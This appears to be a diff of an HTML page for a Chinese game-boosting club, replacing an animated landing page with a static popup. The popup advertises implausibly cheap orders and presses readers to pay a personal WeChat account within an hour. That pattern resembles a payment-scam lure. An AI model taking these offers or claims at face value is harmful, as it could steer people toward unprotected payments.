@@ -1,41 +1,23 @@
 <html lang="zh-CN"><head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <meta name="theme-color" content="#0a0a0a">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>游龙平民电竞俱乐部</title>
-    <!-- Tailwind CSS -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>游龙平民电竞</title>
+    <!-- Tailwind CSS v3 -->
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- Font Awesome -->
     <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
-    <!-- GSAP 动画库 -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/ScrollTrigger.min.js"></script>
-    <!-- 统一的 Tailwind 配置 -->
     <script>
         tailwind.config = {
             theme: {
                 extend: {
                     colors: {
-                        primary: '#0a0a0a',
-                        secondary: '#ffffff',
-                        accent: '#1a1a1a',
-                        text: '#ffffff',
-                        textSecondary: '#b3b3b3'
+                        primary: '#3b82f6',
+                        secondary: '#64748b',
+                        background: '#f3f4f6',
+                        popup: '#ffffff'
                     },
                     fontFamily: {
-                        sans: ['Inter', 'system-ui', 'sans-serif'],
-                    },
-                    animation: {
-                        'float': 'float 6s ease-in-out infinite',
-                        'pulse-slow': 'pulse 4s cubic-bezier(0.4, 0, 0.6, 1) infinite',
-                    },
-                    keyframes: {
-                        float: {
-                            '0%, 100%': { transform: 'translateY(0)' },
-                            '50%': { transform: 'translateY(-20px)' },
-                        }
+                        sans: ['Inter', 'system-ui', 'sans-serif']
                     }
                 }
             }
@@ -43,800 +25,109 @@
     </script>
     <style type="text/tailwindcss">
         @layer utilities {
-            .content-auto {
-                content-visibility: auto;
+            .popup-shadow {
+                box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
             }
-            .glass {
-                background: rgba(255, 255, 255, 0.03);
-                backdrop-filter: blur(15px);
-                -webkit-backdrop-filter: blur(15px);
-                border: 1px solid rgba(255, 255, 255, 0.05);
-                border-radius: 24px;
+            .btn-hover {
+                @apply transition-colors duration-200 hover:bg-blue-600 active:bg-blue-700;
             }
-            .glass-hover {
-                transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            }
-            .glass-hover:hover {
-                background: rgba(255, 255, 255, 0.07);
-                transform: translateY(-8px);
-                box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
-            }
-            .text-gradient {
-                background: linear-gradient(90deg, #ffffff, #e0e0e0);
-                -webkit-background-clip: text;
-                -webkit-text-fill-color: transparent;
-            }
-            .bg-glass {
-                background: rgba(10, 10, 10, 0.85);
-                backdrop-filter: blur(15px);
-                -webkit-backdrop-filter: blur(15px);
-            }
-            .liquid-effect {
-                position: relative;
-                overflow: hidden;
-            }
-            .liquid-effect::before {
-                content: '';
-                position: absolute;
-                top: -50%;
-                left: -50%;
-                width: 200%;
-                height: 200%;
-                background: linear-gradient(
-                    45deg,
-                    rgba(255, 255, 255, 0) 0%,
-                    rgba(255, 255, 255, 0.08) 50%,
-                    rgba(255, 255, 255, 0) 100%
-                );
-                transform: rotate(45deg);
-                animation: liquid-flow 12s linear infinite;
-            }
-            @keyframes liquid-flow {
-                0% {
-                    transform: translateX(-100%) translateY(-100%) rotate(45deg);
-                }
-                100% {
-                    transform: translateX(100%) translateY(100%) rotate(45deg);
-                }
-            }
-            .elastic-button {
-                transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-                border-radius: 50px;
-                overflow: hidden;
-                position: relative;
-                touch-action: manipulation;
-                -webkit-tap-highlight-color: transparent;
-            }
-            .elastic-button::before {
-                content: '';
-                position: absolute;
-                top: 0;
-                left: -100%;
-                width: 100%;
-                height: 100%;
-                background: linear-gradient(
-                    90deg,
-                    transparent,
-                    rgba(255, 255, 255, 0.2),
-                    transparent
-                );
-                transition: all 0.6s;
-            }
-            .elastic-button:hover::before {
-                left: 100%;
-            }
-            .elastic-button:active {
-                transform: scale(0.97);
-            }
-            .ripple {
-                position: absolute;
-                background: rgba(255, 255, 255, 0.3);
-                border-radius: 50%;
-                transform: scale(0);
-                animation: ripple 0.6s linear;
-                pointer-events: none;
-            }
-            @keyframes ripple {
-                to {
-                    transform: scale(4);
-                    opacity: 0;
-                }
-            }
-            .nav-link {
-                position: relative;
-            }
-            .nav-link::after {
-                content: '';
-                position: absolute;
-                bottom: -5px;
-                left: 0;
-                width: 0;
-                height: 2px;
-                background-color: #64ffda;
-                transition: width 0.3s ease;
-            }
-            .nav-link:hover::after {
-                width: 100%;
-            }
-            .scroll-indicator {
-                animation: bounce 2s infinite;
-            }
-            @keyframes bounce {
-                0%, 20%, 50%, 80%, 100% {
-                    transform: translateY(0);
-                }
-                40% {
-                    transform: translateY(-20px);
-                }
-                60% {
-                    transform: translateY(-10px);
-                }
-            }
+        }
+    </style>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', system-ui, sans-serif;
+            background-color: #f3f4f6;
+        }
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .popup {
+            background-color: white;
+            border-radius: 0.5rem;
+            width: 90%;
+            max-width: 500px;
+            max-height: 90vh;
+            overflow-y: auto;
+            padding: 1.5rem;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+        }
+        .qr-code {
+            display: flex;
+            justify-content: center;
+            margin: 1.5rem 0;
+        }
+        .qr-code img {
+            width: 200px;
+            height: 200px;
+        }
+        .confirm-btn {
+            background-color: #3b82f6;
+            color: white;
+            border: none;
+            border-radius: 0.375rem;
+            padding: 0.75rem 1.5rem;
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.2s;
+        }
+        .confirm-btn:hover {
+            background-color: #2563eb;
+        }
+        .confirm-btn:active {
+            background-color: #1d4ed8;
         }
     </style>
 </head>
-<body class="bg-primary text-text overflow-x-hidden">
-    <!-- 导航栏 -->
-    <nav class="fixed top-0 left-0 w-full z-50 bg-glass">
-        <div class="container mx-auto px-6 py-4">
-            <div class="flex items-center justify-between">
-                <div class="flex items-center">
-                    <img src="https://p3-flow-imagex-sign.byteimg.com/tos-cn-i-a9rns2rl98/rc/pc/code_assistant/f7ec9eda2af7467eafa8143caccb12ff~tplv-a9rns2rl98-image.image?rcl=202512102241403B6DF41BC61EB2BC3407&amp;rk3s=8e244e95&amp;rrcfp=e75484ac&amp;x-expires=1765982501&amp;x-signature=65VQsaS3TNdHneZ4NA0FfJpApsE%3D" alt="游龙电竞" class="h-12 w-12">
-                    <span class="ml-3 text-xl font-bold text-gradient">游龙平民电竞</span>
-                </div>
-                <div class="hidden md:flex items-center space-x-10">
-                    <a href="#home" class="nav-link text-text hover:text-secondary transition-colors text-lg">最有</a>
-                    <a href="#about" class="nav-link text-text hover:text-secondary transition-colors text-lg">性价比</a>
-                    <a href="#contact" class="nav-link text-text hover:text-secondary transition-colors text-lg">护航</a>
-                </div>
-                <div class="md:hidden">
-                    <button id="menu-toggle" class="text-text focus:outline-none">
-                        <i class="fa fa-bars text-2xl"></i>
-                    </button>
+<body>
+    <div class="overlay">
+        <div class="popup">
+            <h2 class="text-2xl font-bold text-gray-800 mb-4">重要公告</h2>
+            <div class="announcement-content text-gray-600 mb-6">
+                <p class="mb-3" style="font-size: 18px;">尊敬的老板：</p>
+                <p class="mb-3" style="font-size: 16px; font-weight: bold; font-style: italic; color: rgb(240, 17, 5);">俱乐部推出新单，【0.1元火焰刀】和【0.5元保底1000万】</p>
+                <p class="mb-3" style="font-weight: bold; color: rgb(2, 88, 217);">下单后请立即微信付款，如下单后1小时内未付款，将不会给您派单</p>
+                <p style="font-size: 20px; font-weight: normal; font-style: normal; text-align: center;">添加游龙微信，以便【付款】和【7天无理由退款】微信号【长按复制】:youlong6665</p>
+            </div>
+            <div class="qr-code">
+                <img src="https://p3-flow-imagex-sign.byteimg.com/tos-cn-i-a9rns2rl98/rc/pc/code_assistant/2d2950e24eb849f39618d829b08dc11b~tplv-a9rns2rl98-image.image?rcl=202512131218147AE3BB1D8B08D0A9D853&amp;rk3s=8e244e95&amp;rrcfp=e75484ac&amp;x-expires=1766204294&amp;x-signature=tuQPj5yMXCnFyMRrTIJU6PL9%2FZg%3D" alt="网站二维码">
+                <div class="mt-2 text-center">
+                    <p class="text-gray-700 font-medium">
+</p>
+                    <p class="text-gray-600" style="text-align: center; font-size: 20px; font-weight: bold; font-style: italic; text-decoration: none;">也可以扫码添加微信哦！【长按二维码保存】</p>
                 </div>
             </div>
-        </div>
-        <!-- 移动端菜单 -->
-        <div id="mobile-menu" class="hidden md:hidden bg-glass w-full">
-            <div class="container mx-auto px-6 py-4">
-                <div class="flex flex-col space-y-4">
-                    <a href="#home" class="text-text hover:text-secondary transition-colors py-3 text-lg">首页</a>
-                    <a href="#about" class="text-text hover:text-secondary transition-colors py-3 text-lg">关于我们</a>
-                    <a href="#contact" class="text-text hover:text-secondary transition-colors py-3 text-lg">联系我们</a>
-                </div>
-            </div>
-        </div>
-    </nav>
-
-    <!-- 英雄区域 -->
-    <section id="home" class="min-h-screen flex items-center justify-center relative overflow-hidden pt-20">
-        <!-- 背景动画 -->
-        <div class="absolute inset-0 z-0">
-            <div class="absolute inset-0 bg-gradient-to-b from-primary to-accent"></div>
-            <div class="absolute top-0 left-0 w-full h-full">
-                <div id="particles-js" class="w-full h-full"></div>
-            </div>
-        </div>
-        
-        <!-- 主要内容 -->
-        <div class="container mx-auto px-6 relative z-10">
-            <div class="flex flex-col items-center text-center">
-                <div class="animate-float mb-8">
-                    <img src="https://p3-flow-imagex-sign.byteimg.com/tos-cn-i-a9rns2rl98/rc/pc/super_tool/cd0ae9fd87c84143a813f9aaad99ebae~tplv-a9rns2rl98-image.image?rcl=20251206112323B9A131F2F69B29211A3D&amp;rk3s=8e244e95&amp;rrcfp=f06b921b&amp;x-expires=1767583415&amp;x-signature=qCSKyzHeHVdJ2Bz9d6RfeGRPGKw%3D" alt="游龙电竞" class="h-32 w-32 mx-auto">
-                </div>
-                <h1 class="text-4xl md:text-6xl font-bold mb-6 text-gradient tracking-tight leading-tight" style="font-size: 32px;">欢迎来到游龙平民电竞</h1>
-                <p class="text-base md:text-xl text-textSecondary mb-12 max-w-xs md:max-w-2xl font-light text-center" style="font-size: 20px; font-weight: normal; font-style: italic;">拥有最强售后7天无理由退款</p>
-                
-                <!-- 联系信息 -->
-                <div class="glass glass-hover p-6 md:p-8 rounded-3xl mb-12 md:mb-16 max-w-md w-full border-t border-white/10">
-                    <p class="text-base md:text-xl mb-6 md:mb-8 text-center" style="font-style: italic; font-weight: bold; font-size: 16px; text-decoration: none;">点单前先请添加微信号【长按复制】</p>
-                    <div class="text-2xl md:text-3xl font-bold text-center mb-8 md:mb-10 text-secondary break-all" style="text-decoration: none; font-size: 32px;">youlong6665</div>
-                    <div class="flex flex-col space-y-4 w-full">
-                        <a href="https://e256f60f648f23.lhr.life/" target="_blank" rel="noopener noreferrer" class="py-4 px-8 text-lg md:text-xl font-semibold text-secondary border border-secondary/30 hover:bg-white hover:text-primary transition-all text-center">
-                            立即进入点单
-                        </a>
-                        <a href="https://v.kuaishou.com/JqZtJx0X" target="_blank" rel="noopener noreferrer" class="py-4 px-8 text-lg md:text-xl font-semibold text-secondary border border-secondary/30 hover:bg-white hover:text-primary transition-all text-center">
-                           查看游龙最新作品
-                        </a>
-                    </div>
-                </div>
-                
-                <!-- 滚动指示器 -->
-                <div class="scroll-indicator mt-16">
-                    <i class="fa fa-angle-down text-3xl text-secondary"></i>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- 关于我们 -->
-    <section id="about" class="py-20 relative">
-        <div class="container mx-auto px-6">
-            <div class="flex flex-col md:flex-row items-center">
-                <div class="md:w-1/2 mb-10 md:mb-0">
-                    <img src="https://p3-flow-imagex-sign.byteimg.com/tos-cn-i-a9rns2rl98/rc/pc/code_assistant/769aff962b524e6297b644d19b49e275~tplv-a9rns2rl98-image.image?rcl=20251210224307F4676C994F0BAF45C5BE&amp;rk3s=8e244e95&amp;rrcfp=e75484ac&amp;x-expires=1765982587&amp;x-signature=%2BlqoBL4iREPQk7tMvec9u%2FaEVm0%3D" alt="电竞团队" class="rounded-xl shadow-2xl liquid-effect">
-                </div>
-                <div class="md:w-1/2 md:pl-16">
-                    <h2 class="text-3xl md:text-4xl font-bold mb-8 text-gradient">关于平民电竞</h2>
-                    <p class="text-lg text-textSecondary mb-6">’游龙平民电竞’成立于2025年，创建的目的就是做全网最性价比的顶尖护航，我们的初心是：不做便宜的野鸡护，只做便宜的顶尖护</p>
-                    <p class="text-lg text-textSecondary mb-8">我们提供专业的设备、教练指导和顶尖打手，帮助每一位老板都能把把得吃，享受游戏带来的乐趣。</p>
-                    <div class="grid grid-cols-2 gap-6">
-                        <div class="glass glass-hover p-6 rounded-xl text-center">
-                            <div class="text-4xl font-bold text-secondary mb-2">5+</div>
-                            <div class="text-textSecondary">活跃成员</div>
-                        </div>
-                        <div class="glass glass-hover p-6 rounded-xl text-center">
-                            <div class="text-4xl font-bold text-secondary mb-2">96%</div>
-                            <div class="text-textSecondary">好评率</div>
-                        </div>
-                        <div class="glass glass-hover p-6 rounded-xl text-center">
-                            <div class="text-4xl font-bold text-secondary mb-2">100+</div>
-                            <div class="text-textSecondary">比赛场次</div>
-                        </div>
-                        <div class="glass glass-hover p-6 rounded-xl text-center">
-                            <div class="text-4xl font-bold text-secondary mb-2">10+</div>
-                            <div class="text-textSecondary">游戏项目</div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-
-
-    <!-- 联系我们 -->
-    <section id="contact" class="py-16 md:py-24 relative">
-        <div class="container mx-auto px-6">
-            <div class="text-center mb-12">
-                <h2 class="text-3xl md:text-5xl font-bold mb-6 md:mb-8 text-gradient">微信号</h2>
-                <div class="text-4xl md:text-8xl font-bold text-secondary mb-6 md:mb-8 break-all">youlong6665</div>
-                <p class="text-base md:text-xl text-textSecondary mb-8 md:mb-12">进入游龙快手主页</p>
-                <a href="https://v.kuaishou.com/JqZtJx0X" target="_blank" rel="noopener noreferrer" class="inline-block py-4 px-8 md:px-12 text-lg md:text-xl font-semibold text-secondary border border-secondary/30 hover:bg-white hover:text-primary transition-all">
-                    立即访问快手主页
-                </a>
-            </div>
-        </div>
-    </section>
-
-    <!-- 页脚 -->
-    <footer class="bg-accent py-10">
-        <div class="container mx-auto px-6">
-            <div class="flex flex-col md:flex-row justify-between items-center">
-                <div class="mb-6 md:mb-0">
-                    <div class="flex items-center">
-                        <img src="https://p3-flow-imagex-sign.byteimg.com/tos-cn-i-a9rns2rl98/rc/pc/code_assistant/c71028d8e3524ae8a9b69c047536e70b~tplv-a9rns2rl98-image.image?rcl=20251210225010A1D99E7CF525A1AB44EE&amp;rk3s=8e244e95&amp;rrcfp=e75484ac&amp;x-expires=1765983011&amp;x-signature=iCc9dcOgt2bPDc94IkjtZ17O4LI%3D" alt="游龙电竞" class="h-10 w-10">
-                        <span class="ml-3 text-xl font-bold text-gradient">游龙平民电竞电竞</span>
-                    </div>
-                    <p class="text-textSecondary mt-2">打造全网最有性价比的护航</p>
-                </div>
-                <div class="flex flex-col md:flex-row md:space-x-16 space-y-6 md:space-y-0">
-                    <div>
-                        <h4 class="text-base md:text-lg font-semibold mb-4 text-secondary">
-</h4>
-                        <ul class="space-y-3">
-                            <li><a href="#home" class="text-textSecondary hover:text-secondary transition-colors"></a></li>
-                            <li><a href="#about" class="text-textSecondary hover:text-secondary transition-colors"></a></li>
-                            <li><a href="#contact" class="text-textSecondary hover:text-secondary transition-colors"></a></li>
-                        </ul>
-                    </div>
-                    <div>
-                        <h4 class="text-base md:text-lg font-semibold mb-3 text-secondary">联系我们</h4>
-                        <ul class="space-y-2">
-                            <li class="text-textSecondary">微信：youlong6665</li>
-                           
-                        </ul>
-                    </div>
-                </div>
-            </div>
-
-        </div>
-    </footer>
-
-    <!-- 返回顶部按钮 -->
-    <button id="back-to-top" class="fixed bottom-8 right-8 bg-secondary bg-opacity-20 p-3 rounded-full text-secondary opacity-0 invisible transition-all z-50 hover:bg-secondary hover:text-primary">
-        <i class="fa fa-arrow-up"></i>
-    </button>
-
-    <!-- particles.js 库 -->
-    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
-    
-    <!-- 弹窗样式 -->
-    <style>
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 1000;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.8);
-            backdrop-filter: blur(10px);
-        }
-        
-        .modal-content {
-            background-color: #0a0a0a;
-            margin: 15% auto;
-            padding: 2rem;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 24px;
-            width: 90%;
-            max-width: 500px;
-            text-align: center;
-            animation: modalSlideIn 0.3s ease-out;
-        }
-        
-        @keyframes modalSlideIn {
-            from {
-                opacity: 0;
-                transform: translateY(-50px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        
-        .modal-button {
-            background: #ffffff;
-            color: #0a0a0a;
-            border: none;
-            padding: 1rem 2rem;
-            border-radius: 50px;
-            font-size: 1.1rem;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 1.5rem;
-        }
-        
-        .modal-button:hover {
-            background: #e0e0e0;
-            transform: translateY(-2px);
-        }
-        
-        .modal h2 {
-            color: #ffffff;
-            margin-bottom: 1rem;
-        }
-        
-        .modal p {
-            color: #b3b3b3;
-            line-height: 1.6;
-            margin-bottom: 1.5rem;
-        }
-        
-        .terms-content {
-            max-height: 300px;
-            overflow-y: auto;
-            text-align: left;
-            padding: 1rem;
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 12px;
-            margin-bottom: 1.5rem;
-        }
-        
-        .terms-content::-webkit-scrollbar {
-            width: 6px;
-        }
-        
-        .terms-content::-webkit-scrollbar-track {
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 3px;
-        }
-        
-        .terms-content::-webkit-scrollbar-thumb {
-            background: rgba(255, 255, 255, 0.3);
-            border-radius: 3px;
-        }
-    </style>
-    
-    <!-- 协议弹窗 -->
-    <div id="termsModal" class="modal">
-        <div class="modal-content">
-            <h2 class="text-2xl font-bold mb-4">用户协议与隐私政策</h2>
-            <div class="terms-content">
-                <p class="mb-4">欢迎来到游龙平民电竞俱乐部官网。在您使用本网站之前，请仔细阅读并同意以下条款：</p>
-                <p class="mb-4"><strong>1. 用户协议</strong></p>
-                <p class="mb-4">1.1 本网站仅供用户浏览和获取信息使用。</p>
-                <p class="mb-4">1.2 用户必须遵守中华人民共和国相关法律法规。</p>
-                <p class="mb-4">1.3 禁止使用本网站进行任何违法或不当行为。</p>
-                <p class="mb-4"><strong>2. 隐私政策</strong></p>
-                <p class="mb-4">2.1 我们尊重用户的隐私，不会泄露用户个人信息。</p>
-                <p class="mb-4">2.2 我们可能会收集一些基本信息用于网站优化。</p>
-                <p class="mb-4">2.3 用户可以随时要求删除其个人信息。</p>
-                <p class="mb-4"><strong>3. 免责声明</strong></p>
-                <p class="mb-4">3.1 本网站提供的信息仅供参考，不构成任何承诺。</p>
-                <p class="mb-4">3.2 对于因使用本网站而产生的任何损失，我们不承担责任。</p>
-                <p class="mb-4">3.3 我们有权随时修改网站内容和服务条款。</p>
-                <p>感谢您的理解与支持！</p>
-            </div>
-            <button id="agreeTerms" class="modal-button">我已阅读并同意</button>
+            <a href="https://www.kuaishou.com" target="_blank" rel="noopener noreferrer" class="confirm-btn" style="display: block; text-align: center; text-decoration: none;">好的</a>
         </div>
     </div>
-    
-    <!-- 跳转弹窗 -->
-    <div id="redirectModal" class="modal">
-        <div class="modal-content">
-            <h2 class="text-2xl font-bold mb-4">公告</h2>
-            <p class="text-lg mb-6">1.俱乐部今天全场优惠
-              2.本俱乐部新推出算命单【专业老师傅算命】</p>
-            <button id="agreeRedirect" class="modal-button">好的</button>
 
-        </div>
-    </div>
-    
-    <!-- 自定义脚本 -->
     <script>
-        // 检查用户是否首次访问
+        // 页面加载完成后自动显示弹窗（在这个实现中，弹窗是默认显示的）
         document.addEventListener('DOMContentLoaded', function() {
-            const isFirstVisit = !localStorage.getItem('youlongVisited');
+            // 弹窗已经在HTML中静态定义，无需JS动态显示
+            console.log('弹窗已显示');
             
-            if (isFirstVisit) {
-                // 首次访问，显示协议弹窗
-                showTermsModal();
-            } else {
-                // 非首次访问，显示跳转弹窗
-                setTimeout(showRedirectModal, 1000);
-            }
-            
-            function showTermsModal() {
-                const termsModal = document.getElementById('termsModal');
-                termsModal.style.display = 'block';
-                
-                document.getElementById('agreeTerms').addEventListener('click', function() {
-                    termsModal.style.display = 'none';
-                    localStorage.setItem('youlongVisited', 'true');
-                    // 首次访问，显示欢迎信息
-                    alert('欢迎来到游龙平民电竞俱乐部！');
-                });
-            }
-            
-            function showRedirectModal() {
-                const redirectModal = document.getElementById('redirectModal');
-                redirectModal.style.display = 'block';
-                
-                document.getElementById('agreeRedirect').addEventListener('click', function() {
-                    redirectModal.style.display = 'none';
-                    // 在新标签页中打开指定网站
-                    window.open('https://e256f60f648f23.lhr.life/', '_blank');
-                });
-            }
-            
-            // 点击弹窗外部关闭弹窗
-            window.addEventListener('click', function(event) {
-                const modals = document.querySelectorAll('.modal');
-                modals.forEach(modal => {
-                    if (event.target === modal) {
-                        modal.style.display = 'none';
-                    }
-                });
-            });
-            
-            // 初始化 particles.js
-            particlesJS('particles-js', {
-                particles: {
-                    number: {
-                        value: 40,
-                        density: {
-                            enable: true,
-                            value_area: 800
-                        }
-                    },
-                    color: {
-                        value: '#ffffff'
-                    },
-                    shape: {
-                        type: 'circle',
-                        stroke: {
-                            width: 0,
-                            color: '#000000'
-                        }
-                    },
-                    opacity: {
-                        value: 0.5,
-                        random: true,
-                        anim: {
-                            enable: true,
-                            speed: 1,
-                            opacity_min: 0.1,
-                            sync: false
-                        }
-                    },
-                    size: {
-                        value: 4,
-                        random: true,
-                        anim: {
-                            enable: true,
-                            speed: 1,
-                            size_min: 0.5,
-                            sync: false
-                        }
-                    },
-                    line_linked: {
-                        enable: true,
-                        distance: 200,
-                        color: '#ffffff',
-                        opacity: 0.1,
-                        width: 1
-                    },
-                    move: {
-                        enable: true,
-                        speed: 0.8,
-                        direction: 'none',
-                        random: true,
-                        straight: false,
-                        out_mode: 'out',
-                        bounce: false,
-                        attract: {
-                            enable: false,
-                            rotateX: 600,
-                            rotateY: 1200
-                        }
-                    }
-                },
-                interactivity: {
-                    detect_on: 'canvas',
-                    events: {
-                        onhover: {
-                            enable: true,
-                            mode: 'grab'
-                        },
-                        onclick: {
-                            enable: true,
-                            mode: 'push'
-                        },
-                        resize: true
-                    },
-                    modes: {
-                        grab: {
-                            distance: 120,
-                            line_linked: {
-                                opacity: 0.3
-                            }
-                        },
-                        push: {
-                            particles_nb: 4
-                        },
-                        repulse: {
-                            distance: 100,
-                            duration: 0.4
-                        }
-                    }
-                },
-                retina_detect: true
-            });
-
-            // 移动端菜单切换
-            const menuToggle = document.getElementById('menu-toggle');
-            const mobileMenu = document.getElementById('mobile-menu');
-            
-            menuToggle.addEventListener('click', function() {
-                mobileMenu.classList.toggle('hidden');
-            });
-
-            // 平滑滚动
-            document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-                anchor.addEventListener('click', function(e) {
-                    e.preventDefault();
-                    
-                    // 关闭移动端菜单
-                    if (!mobileMenu.classList.contains('hidden')) {
-                        mobileMenu.classList.add('hidden');
-                    }
-                    
-                    const targetId = this.getAttribute('href');
-                    const targetElement = document.querySelector(targetId);
-                    
-                    if (targetElement) {
-                        window.scrollTo({
-                            top: targetElement.offsetTop - 80,
-                            behavior: 'smooth'
-                        });
-                    }
-                });
-            });
-
-            // 返回顶部按钮
-            const backToTopButton = document.getElementById('back-to-top');
-            
-            window.addEventListener('scroll', function() {
-                if (window.pageYOffset > 300) {
-                    backToTopButton.classList.remove('opacity-0', 'invisible');
-                    backToTopButton.classList.add('opacity-100', 'visible');
-                } else {
-                    backToTopButton.classList.remove('opacity-100', 'visible');
-                    backToTopButton.classList.add('opacity-0', 'invisible');
-                }
-            });
-            
-            backToTopButton.addEventListener('click', function() {
-                window.scrollTo({
-                    top: 0,
-                    behavior: 'smooth'
-                });
-            });
-
-            // 表单提交
-            const contactForm = document.getElementById('contact-form');
-            
-            contactForm.addEventListener('submit', function(e) {
-                e.preventDefault();
-                
-                // 获取表单数据
-                const name = document.getElementById('name').value;
-                const email = document.getElementById('email').value;
-                const subject = document.getElementById('subject').value;
-                const message = document.getElementById('message').value;
-                
-                // 简单验证
-                if (!name || !email || !subject || !message) {
-                    alert('请填写所有必填字段');
-                    return;
-                }
-                
-                // 模拟表单提交
-                alert('留言已发送，我们会尽快回复您！');
-                contactForm.reset();
-            });
-
-            // 移除所有复杂的JavaScript跳转逻辑，让浏览器原生处理链接
-            // 这样可以确保链接能够正常跳转
-            
-            // 创建点击波纹效果
-            function createRipple(e, button) {
-                const circle = document.createElement('div');
-                const diameter = Math.max(button.clientWidth, button.clientHeight);
-                const radius = diameter / 2;
-                
-                circle.style.width = circle.style.height = `${diameter}px`;
-                circle.style.left = `${e.clientX - button.getBoundingClientRect().left - radius}px`;
-                circle.style.top = `${e.clientY - button.getBoundingClientRect().top - radius}px`;
-                circle.classList.add('ripple');
-                
-                const ripple = button.getElementsByClassName('ripple')[0];
-                if (ripple) {
-                    ripple.remove();
-                }
-                
-                button.appendChild(circle);
-            }
-
-            // GSAP 动画
-            gsap.registerPlugin(ScrollTrigger);
-            
-            // 页面加载动画
-            gsap.set('body', {opacity: 0});
-            gsap.to('body', {opacity: 1, duration: 1});
-            
-            // 英雄区域入场动画
-            const heroTimeline = gsap.timeline({
-                delay: 0.3,
-                ease: "power3.out"
-            });
-            
-            heroTimeline.from('.animate-float', {
-                opacity: 0,
-                scale: 0.5,
-                duration: 1.2,
-                ease: "elastic.out(1, 0.5)"
-            })
-            .from('h1.text-gradient', {
-                opacity: 0,
-                y: 30,
-                duration: 0.8
-            }, "-=0.5")
-            .from('p.text-textSecondary', {
-                opacity: 0,
-                y: 20,
-                duration: 0.8
-            }, "-=0.3")
-            .from('.glass.glass-hover', {
-                opacity: 0,
-                y: 40,
-                duration: 1,
-                ease: "back.out(1.7)"
-            }, "-=0.3");
-            
-            // 滚动触发动画
-            gsap.utils.toArray('.text-gradient:not(h1)').forEach(element => {
-                gsap.from(element, {
-                    opacity: 0,
-                    y: 30,
-                    duration: 0.8,
-                    scrollTrigger: {
-                        trigger: element,
-                        start: 'top 80%',
-                        toggleActions: 'play none none none'
-                    }
-                });
-            });
-            
-            // 卡片动画
-            gsap.utils.toArray('.glass-hover:not(.hero .glass-hover)').forEach((element, index) => {
-                gsap.from(element, {
-                    opacity: 0,
-                    y: 40,
-                    duration: 0.8,
-                    delay: index * 0.1,
-                    scrollTrigger: {
-                        trigger: element,
-                        start: 'top 85%',
-                        toggleActions: 'play none none none'
-                    }
-                });
-            });
-            
-            // 图片动画
-            gsap.from('.liquid-effect', {
-                opacity: 0,
-                scale: 0.9,
-                duration: 1.2,
-                scrollTrigger: {
-                    trigger: '.liquid-effect',
-                    start: 'top 85%',
-                    toggleActions: 'play none none none'
-                }
-            });
-            
-            // 数字计数动画
-            gsap.utils.toArray('.glass-hover .text-4xl').forEach(element => {
-                const target = parseInt(element.textContent);
-                const suffix = element.textContent.replace(/\d/g, '');
-                
-                gsap.fromTo(element, 
-                    {textContent: '0'},
-                    {
-                        textContent: target,
-                        duration: 2,
-                        ease: "power2.out",
-                        snap: {textContent: 1},
-                        onUpdate: function() {
-                            element.textContent = Math.round(this.targets()[0].textContent) + suffix;
-                        },
-                        scrollTrigger: {
-                            trigger: element,
-                            start: 'top 80%',
-                            toggleActions: 'play none none none'
-                        }
-                    }
-                );
-            });
-            
-            // 粒子背景交互增强
-            document.addEventListener('mousemove', function(e) {
-                const particles = document.querySelectorAll('#particles-js canvas');
-                if (particles.length) {
-                    const canvas = particles[0];
-                    const rect = canvas.getBoundingClientRect();
-                    const x = e.clientX - rect.left;
-                    const y = e.clientY - rect.top;
-                    
-                    // 向粒子系统发送鼠标位置信息
-                    window.pJSDom[0].pJS.interactivity.mouse.pos_x = x;
-                    window.pJSDom[0].pJS.interactivity.mouse.pos_y = y;
-                    window.pJSDom[0].pJS.interactivity.events.mouse.move(event);
-                }
-            });
-            
-            // 触摸设备交互增强
-            document.addEventListener('touchmove', function(e) {
-                if (e.touches.length > 0) {
-                    const touch = e.touches[0];
-                    const particles = document.querySelectorAll('#particles-js canvas');
-                    if (particles.length) {
-                        const canvas = particles[0];
-                        const rect = canvas.getBoundingClientRect();
-                        const x = touch.clientX - rect.left;
-                        const y = touch.clientY - rect.top;
-                        
-                        // 向粒子系统发送触摸位置信息
-                        window.pJSDom[0].pJS.interactivity.mouse.pos_x = x;
-                        window.pJSDom[0].pJS.interactivity.mouse.pos_y = y;
-                        window.pJSDom[0].pJS.interactivity.events.touchmove(event);
-                    }
-                }
+            // 为按钮添加点击事件监听
